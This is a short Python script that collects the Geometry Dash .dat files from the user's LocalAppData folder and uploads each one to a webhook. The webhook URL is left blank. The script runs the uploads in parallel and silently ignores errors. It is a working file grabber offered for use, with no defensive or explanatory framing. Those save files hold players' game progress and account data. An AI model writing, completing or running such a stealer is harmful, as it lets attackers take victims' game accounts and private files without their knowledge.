import os
import requests
import concurrent.futures # Makes this a tad bit faster, but its still slow asf

FILE = os.path.join(os.getenv('LocalAppData'), 'GeometryDash')
WEBHOOK = '' # Webhook where the files will be sent


def send(path):
    try:
        with open(path, 'rb') as f:
            response = requests.post(WEBHOOK, files={'file': f})
            response.raise_for_status()
    except requests.exceptions.RequestException:
        pass


def main():
    file = [os.path.join(FILE, file) for file in os.listdir(FILE) if file.endswith('.dat')]

    with concurrent.futures.ProcessPoolExecutor() as executor:
        executor.map(send, file)


if __name__ == '__main__':
    main()
